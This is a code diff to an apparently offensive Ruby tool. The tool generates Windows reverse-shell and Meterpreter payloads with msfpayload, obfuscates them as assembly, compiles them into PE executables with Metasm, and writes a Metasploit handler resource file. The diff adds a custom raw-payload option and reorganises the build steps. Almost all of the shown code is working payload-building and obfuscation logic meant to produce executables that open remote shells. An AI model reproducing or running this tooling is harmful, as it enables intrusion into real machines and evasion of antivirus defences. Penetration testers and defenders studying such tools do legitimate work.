@@ -74,7 +74,7 @@ puts "1) windows/shell/reverse_tcp"
 puts "2) windows/meterpreter/reverse_tcp"
 puts "3) windows/meterpreter/reverse_https"
 puts "4) windows/meterpreter/reverse_http"
-puts "5) Custom payload"
+puts "5) Custom payload (raw msfpayload file)"
 puts "6) Obfuscate ASM file only"
 puts "**************************************"
 puts "Select a payload (1-6):"
@@ -121,8 +121,9 @@ case PAYLOAD
   puts "Please select 1-6 only."
   exitrandom
 end
-unless payload_num == 6
-  #Making payload
+
+if payload_num < 5
+    #Making payload
   %x{msfpayload #{payload_name} LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
   #Making the rc file
   rc = File.new("obfy.rc", "w+")
@@ -136,6 +137,9 @@ unless payload_num == 6
   rc.puts "set PrependMigrate true"
   rc.puts "exploit -j -z"
   rc.close
+end
+
+unless payload_num == 6
   #Converting it to the asm code
   raw = File.open(raw_file, 'rb')
   exefmt =  AutoExe.orshellcode { Metasm.const_get('Ia32').new }
@@ -170,7 +174,11 @@ unless payload_num == 6
   src = File.read(asm_ghost)
   exe = Metasm::PE.assemble(Metasm::Ia32.new, src, asm_ghost)
   exe.encode_file(exe_file, :bin)
-  puts "#{exe_file} was created, payload =#{payload_name}, LHOST=#{LHOST}, and LPORT=#{LPORT}"
+  if payload_num == 5
+    puts "#{exe_file} was created."
+  else
+    puts "#{exe_file} was created, payload =#{payload_name}, LHOST=#{LHOST}, and LPORT=#{LPORT}"
+  end
   #Cleaning up
   File.delete(asm_ghost) if File.file?(asm_ghost)
   File.delete(raw_file) if File.file?(raw_file)
